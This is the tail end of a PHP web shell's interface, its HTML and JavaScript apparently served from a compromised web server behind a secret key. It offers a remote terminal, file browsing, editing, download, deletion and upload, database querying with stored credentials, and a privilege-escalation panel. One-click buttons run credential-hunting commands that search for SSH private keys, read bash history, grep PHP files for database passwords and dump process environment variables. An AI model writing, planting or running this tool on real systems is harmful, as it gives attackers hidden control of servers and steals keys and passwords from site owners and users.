        <span class="chip" onclick="runQT('find / -name \\'*.conf\\' 2>/dev/null | head -40')">configs</span>
        <span class="chip" onclick="runQT('ls -la /home/')">homes</span>
        <span class="chip" onclick="runQT('cat ~/.bash_history 2>/dev/null')">bash hist</span>
        <span class="chip" onclick="runQT('find / -name id_rsa 2>/dev/null')">SSH keys</span>
        <span class="chip" onclick="runQT('find / -name \\"*.php\\" 2>/dev/null | xargs grep -l \\"pass\\|db_\\|mysql\\" 2>/dev/null | head -20')">PHP creds</span>
        <span class="chip" onclick="runQT('cat /proc/1/environ 2>/dev/null | tr \\\"\\\\0\\\" \\\"\\\\n\\\"')">pid1 env</span>
      </div>
    </div>
  </div>
</div><!-- #main -->
</div><!-- #root -->

<!-- DB CRED MODAL -->
<div id="db-modal">
  <div id="db-modal-box">
    <h3>✎ DATABASE CREDENTIALS</h3>
    <div class="fr"><label>Host</label><input type="text" id="m_h" style="flex:1" placeholder="localhost"></div>
    <div class="fr"><label>User</label><input type="text" id="m_u" style="flex:1"></div>
    <div class="fr"><label>Password</label><input type="password" id="m_p" style="flex:1"></div>
    <div class="fr"><label>Database</label><input type="text" id="m_n" style="flex:1" placeholder="(optional)"></div>
    <div style="display:flex;gap:8px;margin-top:12px">
      <button class="btn" onclick="saveDbCreds()">💾 Save</button>
      <button class="btn red" onclick="closeDbModal()">✕ Cancel</button>
      <button class="btn yel" onclick="clearDbCreds()">🗑 Clear</button>
    </div>
    <div style="color:var(--muted);font-size:10px;margin-top:10px">Stored in browser localStorage. Not sent to server until you run a query.</div>
  </div>
</div>

<script>
const KEY  = <?=json_encode($KEY)?>;
const DIR  = <?=json_encode($dir)?>;
const PDIR = <?=json_encode($parent_dir)?>;

// ── Tabs ─────────────────────────────────────
document.querySelectorAll('.tab').forEach(t =>
  t.addEventListener('click', () => switchTab(t.dataset.panel)));
function switchTab(n) {
  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.panel===n));
  document.querySelectorAll('.panel').forEach(p => p.classList.toggle('active', p.id==='panel-'+n));
}

// ── File browser ─────────────────────────────
function navDir(path) {
  if (!path || path === DIR) return;
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dir='+encodeURIComponent(path);
}
function fbClick(el) {
  if (el.dataset.dir === '1') navDir(el.dataset.path);
}
function editFile(path) {
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dir='+encodeURIComponent(DIR)+'&edit='+encodeURIComponent(path);
}
function dlFile(path) {
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dl='+encodeURIComponent(path)+'&dir='+encodeURIComponent(DIR);
}
function delFile(path, name) {
  if (!confirm('Delete '+name+'?')) return;
  window.location.href = '?key='+encodeURIComponent(KEY)+'&del='+encodeURIComponent(path)+'&dir='+encodeURIComponent(DIR);
}

// goto box – also navigates on blur if changed
const gotoInput = document.getElementById('fb-goto');
gotoInput.addEventListener('keydown', e => { if(e.key==='Enter') navDir(gotoInput.value); });

// ── Terminal ─────────────────────────────────
const termHist = document.getElementById('term-hist');
const termIn   = document.getElementById('term-in');
const termPs1  = document.getElementById('term-ps1');
const termCwd  = document.getElementById('term-cwd');

// Command history via sessionStorage
let cmdH = JSON.parse(sessionStorage.getItem('cmdhist')||'[]');
let hidx = cmdH.length;

termIn.addEventListener('keydown', e => {
  if (e.key === 'ArrowUp')   { if(hidx>0) termIn.value=cmdH[--hidx]; e.preventDefault(); }
  if (e.key === 'ArrowDown') { hidx=Math.min(hidx+1,cmdH.length); termIn.value=cmdH[hidx]||''; e.preventDefault(); }
});

document.getElementById('term-form').addEventListener('submit', () => {
  const v = termIn.value.trim();
  if (v) { cmdH.push(v); sessionStorage.setItem('cmdhist', JSON.stringify(cmdH.slice(-200))); hidx=cmdH.length; }
});

// Scroll terminal to bottom on load
termHist.scrollTop = termHist.scrollHeight;

// Sync ps1 + cwd hidden field from PHP-resolved DIR
termPs1.textContent = DIR + ' $';
termCwd.value = DIR;

function runQ(cmd) {
  termIn.value = cmd;
  document.getElementById('term-form').submit();
}
function runQT(cmd) { switchTab('terminal'); runQ(cmd); }

// ── DB credentials (localStorage) ────────────
const LS = 'hs41_db';
function loadCreds() { try { return JSON.parse(localStorage.getItem(LS)||'null'); } catch(e){return null;} }
function applyCreds() {
  const c = loadCreds();
  const b = document.getElementById('db-badge');
  if (c && c.user) {
    document.getElementById('f_h').value = c.host||'localhost';
    document.getElementById('f_u').value = c.user||'';
    document.getElementById('f_p').value = c.pass||'';
    document.getElementById('f_n').value = c.name||'';
    b.textContent = c.user+'@'+(c.name||c.host||'localhost');
    b.className = 'badge ok';
  } else {
    b.textContent = 'No credentials'; b.className = 'badge err';
  }
}
function openDbModal() {
  const c = loadCreds()||{};
  document.getElementById('m_h').value = c.host||'localhost';
  document.getElementById('m_u').value = c.user||'';
  document.getElementById('m_p').value = c.pass||'';
  document.getElementById('m_n').value = c.name||'';
  document.getElementById('db-modal').classList.add('open');
}
function closeDbModal() { document.getElementById('db-modal').classList.remove('open'); }
function saveDbCreds() {
  localStorage.setItem(LS, JSON.stringify({
    host: document.getElementById('m_h').value,
    user: document.getElementById('m_u').value,
    pass: document.getElementById('m_p').value,
    name: document.getElementById('m_n').value,
  }));
  applyCreds(); closeDbModal();
}
function clearDbCreds() { localStorage.removeItem(LS); applyCreds(); closeDbModal(); }
applyCreds();

function setSql(q) { document.getElementById('sql_ta').value = q; }

// ── CSV Export ────────────────────────────────
const SQL_COLS = <?=json_encode($sql_columns)?>;
const SQL_ROWS = <?=json_encode($sql_rows)?>;
function exportCsv() {
  if (!SQL_COLS.length) return;
  const esc = v => '"'+String(v??'').replace(/"/g,'""')+'"';
  let csv = SQL_COLS.map(esc).join(',') + '\r\n';
  SQL_ROWS.forEach(row => { csv += SQL_COLS.map(c => esc(row[c]??'')).join(',') + '\r\n'; });
  const a = document.createElement('a');
  a.href = 'data:text/csv;charset=utf-8,'+encodeURIComponent(csv);
  a.download = 'query_export_'+Date.now()+'.csv';
  a.click();
}

// ── Column resizer ────────────────────────────
function startResize(e, handle) {
  e.preventDefault();
  const th = handle.parentElement;
  const startX = e.clientX;
  const startW = th.offsetWidth;
  handle.classList.add('dragging');
  function onMove(ev) { th.style.width = Math.max(40, startW + ev.clientX - startX)+'px'; }
  function onUp()   { handle.classList.remove('dragging'); document.removeEventListener('mousemove',onMove); document.removeEventListener('mouseup',onUp); }
  document.addEventListener('mousemove', onMove);
  document.addEventListener('mouseup', onUp);
}

// ── Dropzone ─────────────────────────────────
const dz = document.getElementById('dropzone');
dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('over'); });
dz.addEventListener('dragleave', () => dz.classList.remove('over'));
dz.addEventListener('drop', e => {
  e.preventDefault(); dz.classList.remove('over');
  if (e.dataTransfer.files.length) {
    const dt = new DataTransfer(); dt.items.add(e.dataTransfer.files[0]);
    document.getElementById('ufile').files = dt.files;
    document.getElementById('upload-form').submit();
  }
});

// ── Auto-switch panel based on PHP results ────
<?php if($edit_file): ?>switchTab('fileops');
<?php elseif($net_result): ?>switchTab('network');
<?php elseif($ps_result): ?>switchTab('processes');
<?php elseif($env_result): ?>switchTab('env');
<?php elseif($priv_result): ?>switchTab('privesc');
<?php elseif($sql_result!==null||$sql_error): ?>switchTab('database');
<?php elseif($compress_result||$chmod_result||$delete_result||$edit_result): ?>switchTab('fileops');
<?php endif; ?>
</script>
</body>
</html>
